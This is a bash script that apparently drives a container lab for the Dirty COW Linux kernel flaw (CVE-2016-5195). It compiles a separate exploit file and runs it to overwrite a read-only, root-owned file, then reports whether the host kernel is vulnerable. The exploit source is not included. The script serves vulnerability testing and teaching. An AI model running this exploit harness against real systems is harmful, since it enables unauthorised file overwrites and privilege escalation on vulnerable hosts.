#!/bin/bash

# Dirty COW (CVE-2016-5195) Exploit Orchestrator / Diagnostic Lab
# Runs inside the Docker Container as a non-privileged user

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${CYAN}================================================================${NC}"
echo -e "${CYAN}          Dirty COW (CVE-2016-5195) Container Lab            ${NC}"
echo -e "${CYAN}================================================================${NC}"
echo ""

# Display system diagnostics
echo -e "${YELLOW}[*] System Diagnostics:${NC}"
echo -e "  - Current User: $(whoami) (UID: $(id -u))"
echo -e "  - Container OS: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
echo -e "  - Shared Host Linux Kernel: $(uname -r -v)"
echo ""

TARGET_FILE="/var/secret/target.txt"

echo -e "${YELLOW}[*] Examining Target File Properties:${NC}"
ls -l "$TARGET_FILE"
echo -e "  - File Owner: $(stat -c '%U' "$TARGET_FILE")"
echo -e "  - File Permissions: $(stat -c '%A' "$TARGET_FILE")"
echo -e "  - Current Contents:"
echo -e "    --> ${CYAN}$(cat "$TARGET_FILE")${NC}"
echo ""

# Compile the C exploit
echo -e "${YELLOW}[*] Compiling Exploit C Code...${NC}"
gcc -pthread dirtyc0w.c -o dirtyc0w
if [ $? -ne 0 ]; then
    echo -e "${RED}[-] Compilation failed! Exiting.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Compilation successful! Output binary: ./dirtyc0w${NC}"
echo ""

# Running the exploit
echo -e "${YELLOW}[*] Triggering Exploit... Attempting to write 'DIRTY_COW_SUCCESS!!!' to target file...${NC}"
echo -e "  - Note: This is running as a low-privileged user '$(whoami)' with no write access."
echo -e "  - Initiating kernel race condition threads..."
echo ""

# Run the binary
./dirtyc0w "$TARGET_FILE" "DIRTY_COW_SUCCESS!!!"

echo ""
echo -e "${YELLOW}[*] Verifying Attack Status:${NC}"
echo -e "  - Reading target file contents now:"
RESULT=$(cat "$TARGET_FILE")
echo -e "    --> ${CYAN}${RESULT}${NC}"
echo ""

if [ "$RESULT" == "DIRTY_COW_SUCCESS!!!" ]; then
    echo -e "${RED}[!!!] ATTACK SUCCESSFUL! [!!!]${NC}"
    echo -e "${RED}The read-only, root-owned file was successfully overwritten!${NC}"
    echo -e "This container is running on a host with a VULNERABLE Linux kernel."
    echo -e "The race condition bypassed memory write protections."
else
    echo -e "${GREEN}[+] ATTACK PREVENTED / MITIGATED${NC}"
    echo -e "${GREEN}The target file remains unaltered.${NC}"
    echo -e "This container's host Linux kernel is PATCHED and secure against CVE-2016-5195."
    echo -e "The kernel correctly serialized the Copy-On-Write logic, rejecting unauthorized writes."
fi

echo ""
echo -e "${CYAN}================================================================${NC}"
echo -e "${CYAN}               Lab Demonstration Completed                     ${NC}"
echo -e "${CYAN}================================================================${NC}"
